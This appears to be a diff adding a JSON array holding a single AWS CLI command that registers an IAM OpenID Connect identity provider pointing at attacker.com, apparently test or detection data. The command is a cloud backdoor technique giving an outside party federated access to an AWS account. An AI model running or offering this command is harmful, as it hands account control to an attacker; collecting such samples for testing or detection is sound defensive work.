@@ -1,0 +1,3 @@
+[
+  "aws iam create-open-id-connect-provider --url https://attacker.com --client-id-list sts.amazonaws.com"
+]
